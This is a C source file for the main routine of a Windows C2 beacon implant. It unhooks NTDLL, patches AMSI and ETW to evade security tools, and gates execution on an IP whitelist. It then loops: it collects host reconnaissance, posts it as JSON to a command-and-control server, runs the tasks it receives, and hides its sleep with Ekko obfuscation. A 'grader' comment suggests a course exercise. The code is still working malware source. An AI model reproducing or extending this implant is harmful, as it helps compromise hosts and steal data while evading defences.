
#include "anti_analysis.h"
#include "beacon.h"
#include "comms.h"
#include "config.h"
#include "evasion.h"
#include "killswitch.h"
#include "recon.h"
#include <stdio.h>
#include <windows.h>

VOID beacon_run() {
    printf("[*] beacon_run() starting\n");

    // 1 -- evasion: unhook NTDLL, patch AMSI/ETW (evasion.c)
    anti_analysis_run(FALSE);
    if(!evasion_run())
    {
        printf("[!]Evasion failed --continuing\n");
    }

    // 2 -- IP gate (comms.c, Mod 21/73)
    ip_whitelist_gate(); // exits if out of range

    // 3 -- connectivity check
    BOOL connected = FALSE;
    checking_connection(&connected);
    if (!connected) { ExitProcess(0); }

    // 4 -- main beacon loop
    while (1) {
        // soft kill check
        if (killswitch_is_active()) Sleep(INFINITE);

        // collect host recon
        CHECKIN_INFO info = {0};
        recon_collect(&info);
        recon_print(&info); // visible output for grader

        // serialize to JSON
        CHAR* pJson = NULL;
        DWORD dwLen = 0;
        recon_serialize(&info, &pJson, &dwLen);

        // post to C2 + receive task
        BYTE* taskBlob    = NULL;
        DWORD taskBlobLen = 0;
        beacon_post((BYTE*)pJson, dwLen, &taskBlob, &taskBlobLen);
        HeapFree(GetProcessHeap(), 0, pJson);

        // dispatch task if received
        if (taskBlob && taskBlobLen > 0) {
            dispatch_task(taskBlob, taskBlobLen);
            HeapFree(GetProcessHeap(), 0, taskBlob);
        }

        // sleep with Ekko obfuscation + jitter (interval from config.h)
        ekko_sleep(jitter(SLEEP_INTERVAL_MS));
    }
}

// EXE entry point
#ifndef BEACON_DLL
int main() {
    beacon_run();
    return 0;
}
#endif
